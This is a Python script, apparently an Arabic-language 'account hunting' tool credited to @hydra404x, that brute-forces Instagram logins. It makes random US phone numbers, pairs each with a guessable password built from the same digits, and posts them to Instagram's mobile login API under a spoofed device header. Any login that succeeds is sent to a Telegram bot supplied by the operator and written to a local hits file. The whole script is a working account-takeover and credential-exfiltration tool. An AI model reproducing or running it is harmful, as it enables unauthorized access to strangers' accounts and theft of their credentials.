from typing import Mapping
try:
    import random, requests, os, uuid, time, secrets
    from uuid import uuid4
except ModuleNotFoundError:
    os.system('pip install time')
    os.system('pip install uuid')
    os.system('pip install random')
    os.system('pip install requests')
else:
    BRed = '\x1b[1;31m'
    BGreen = '\x1b[1;32m'
    BYellow = '\x1b[1;33m'
    BBlue = '\x1b[1;34m'
    BPurple = '\x1b[1;35m'
    BCyan = '\x1b[1;36m'
    BWhite = '\x1b[1;37m'
#=============(مكاتب)===========
try:
	import  os , sys , random, requests , time , json , secrets,uuid
	import subprocess
	from bs4 import BeautifulSoup as kedo
	from uuid import uuid4
	from time import sleep 
	import webbrowser
except ImportError as Alosh:
	os.system('pip install requests')
	os.system('pip install bs4')
#============(ألاوان)=============
Z = '\033[1;31m' #احمر
X = '\033[1;33m' #اصفر
Z1 = '\033[2;31m' #احمر ثاني
F = '\033[2;32m' #اخضر
A = '\033[2;34m'#ازرق
C = '\033[2;35m' #وردي
C = "\033[1;97m" #ابيض
B = '\033[2;36m'#سمائي
Y = '\033[1;34m' #ازرق فاتح
E = '\033[1;31m' #احمر
#============(لوجو)=============
ali= """                                                   
      __      ___        ___       
      FI      RA         S

\033[1;31m--------------------------------
\033[1;33m< \033[2;32mMy telegram channel ids tool FIRAS \033[1;33m>
\033[1;31m[\033[2;32m⌯\033[1;31m] \033[1;97mTelegram      : @hydra404x 
\033[1;31m[\033[2;32m⌯\033[1;31m] \033[1;97mDeveloper     : @hydra404x
\033[1;31m--------------------------------
 """
#============(توكن و ايدي تيلي)============ 
print(ali)
tok = input(Z+"["+F+"⌯"+Z+"]"+X+ " Token TeLe"+Z+" :\n"+B)
ID = input(Z+"["+F+"⌯"+Z+"]"+X+ " ID TeLe"+Z+" :\n"+B)
os.system('clear')

#============(اعدات للصيد)=============
sr = 0
bd = 0
ht = 0
ib = 0
#============(اتصالات وتحكمات )=============
start_msg = requests.post(f"https://api.telegram.org/bot{tok}/sendMessage?chat_id={ID}&text=\nجاي صيد حسابات\n= = = = = = = = = = = =\n \n اذا واجهت مشاكل يمكنك مراسة المبرمج\n لتواصل اذا واجهت مشكله : @@hydra404x\n معرفي الرسمي : @@hydra404x\n قناتي الرسمه : @hydra404x\n= = = = = = = = = = = =\nعدد الحسابات التي صتدها من هذه النافذه [{ht}]✅").json()
id_msg = start_msg['result']['message_id']        
t = time.localtime()
current_time = time.strftime('%H:%M:%S', t)
sleep(2)
w = 'https://pastebin.com/raw/mpWBGQKF'
rss = requests.get(w).text
if '' in rss:
            sleep(0.1)
            r = requests.Session()
            user = '0123456789'
            while True:
                us = str(''.join((random.choice(user) for i in range(7))))
                
                username = '+1310' + us
                password = '310' + us
                url = 'https://i.instagram.com/api/v1/accounts/login/'
                headers = {'User-Agent':'Instagram 113.0.0.39.122 Android (24/5.0; 515dpi; 1440x2416; huawei/google; Nexus 6P; angler; angler; en_US)',  'Accept':'*/*',  'Cookie':'missing', 
                 'Accept-Encoding':'gzip, deflate', 
                 'Accept-Language':'en-US', 
                 'X-IG-Capabilities':'3brTvw==', 
                 'X-IG-Connection-Type':'WIFI', 
                 'Content-Type':'application/x-www-form-urlencoded; charset=UTF-8', 
                 'Host':'i.instagram.com'}
                uid = str(uuid4())
                data = {'uuid':uid,  'password':password,  'username':username, 
                 'device_id':uid, 
                 'from_reg':'false', 
                 '_csrftoken':'missing', 
                 'login_attempt_countn':'0'}
                req_login = r.post(url, headers=headers, data=data, allow_redirects=True)
                if 'logged_in_user' in req_login.text:
                    ht += 1
                    
                    tlg = (f'''https://api.telegram.org/bot{tok}/sendMessage?chat_id={ID}&text=جبتلك حساب 🔥  
= = = = = = = = = = = = =
.✅.𝒉𝒊𝒕 [ {ht} ] 
.❌.𝒃𝒂𝒅 [ {bd} ] 
.🔐.Secure[ {sr} ] 
.🌐.𝐜𝐨𝐮𝐧𝐭𝐫𝐲 [ 🇺🇸 ]
.🕡.𝒕𝒊𝒎𝒆 [{current_time}]
= = = = = = = = = = = = =
.📧.𝒆𝒎𝒂𝒊𝒍 [ {username} ]
.🙎‍♂.𝒑𝒂𝒔𝒔 [ {password} ]
= = = = = = = = = = = = =
 𝒃𝒚:- @hydra404x 
  ''' )
                    i = requests.post(tlg)
                    with open('insta-hits.txt', 'a') as (HACKED):
                        HACKED.write('{}:{}'.format(username, password))
                elif '"message":"challenge_required","challenge"' in req_login.text:
                    ib += 1                
                    sr+=1
                else:
                    os.system('cls' if os.name == 'nt' else 'clear')
                    print (f''' 
                    

               _______
               FIRAS                                        
\033[1;31m--------------------------------
\033[1;33m< \033[2;32mMy telegram channel ids tool Aidel \033[1;33m>
\033[1;31m[\033[2;32m⌯\033[1;31m] \033[1;97mTelegram      : @hydra404x
\033[1;31m[\033[2;32m⌯\033[1;31m] \033[1;97mDeveloper     : @hydra404x
\033[1;31m--------------------------------

          \033[1;33m<\033[2;32m USA \033[1;33m>                                                                                                                                                                
{E}({X}{username}{E}) {B} ➥ {E}({X}{password}{E})
{E}-------------------------------
{E}({X}➥{E}){X}secure{E} ➥  {X}{sr}
{E}({F}➥{E}){F}Good{E} ➥  {F}{ht}
{E}({B}➥{E}){B}Bad{E} ➥ {B}{bd}
{E}-------------------------------
{X}telegram {E}: {F}@hydra404x
               
                    ''')                    
                    bd+=1
else:		
	ht+=1      
	
	        	
print ('	 تمم صيد حبي')	     
print ('حقوقي شرفك لاتغير')   	        	